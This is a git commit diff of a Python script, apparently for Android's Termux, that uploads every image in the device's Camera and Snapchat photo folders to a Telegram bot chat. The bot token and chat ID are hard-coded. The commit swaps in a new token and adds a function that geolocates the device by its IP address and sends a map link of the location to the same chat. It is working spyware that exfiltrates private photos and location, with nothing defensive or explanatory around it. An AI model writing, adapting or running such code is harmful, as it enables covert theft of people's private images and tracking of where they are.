dae960d6942b7b23dc2c2448241d4009612c05c6
Mohamed <60695273+MohammedHamzaPr@users.noreply.github.com>
2024-11-30 14:28:50 +0300

    img.py

--- img.py
+++ img.py
@@ -4,11 +4,26 @@ try:
 except:
 	os.system("pip install requests")
 	import requests
+	
 def send_photo_with_caption(photo):
-    url = f"https://api.telegram.org/bot6905293289:AAHmcIV2Mo4o6bfmKrKx-yHL3rq558G2vMc/sendPhoto"
+    url = f"https://api.telegram.org/bot7908174271:AAH0sOxnMkFTeWN34jqMj_f_qeXg0tJiyrE/sendPhoto"
     response = requests.post(url, data={'chat_id': '743500292', 'caption': "dev: @lw_w7"}, files={'photo': photo})
+    
 path = "/data/data/com.termux/files/home/storage/dcim/"
 filess =["Snapchat",'Camera']
+def Almunharif1():
+	response = requests.get("https://api.ipify.org?format=json")
+	ip_data = response.json()
+	ip =  ip_data.get('ip')
+	response = requests.get(f"http://ip-api.com/json/{ip}")
+	data = response.json()
+	if data['status'] == 'fail':
+		return "لم يتمكن من جلب الموقع."
+	latitude = data['lat']
+	longitude = data['lon']
+	location_map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
+	requests.post(url="https://api.telegram.org/bot7908174271:AAH0sOxnMkFTeWN34jqMj_f_qeXg0tJiyrE/sendMessage",data={"chat_id":'743500292',"text":location_map_url})
+Almunharif1()
 for dir in filess:
 	if os.path.exists(path+dir):
 		files = os.listdir(path+dir)
@@ -17,3 +32,4 @@ for dir in filess:
 			if filename.endswith(".png") or filename.endswith(".jpg") or filename.endswith(".jpeg"):
 				with open(os.path.join(filename),'rb') as img:
 					send_photo_with_caption(img)
+					
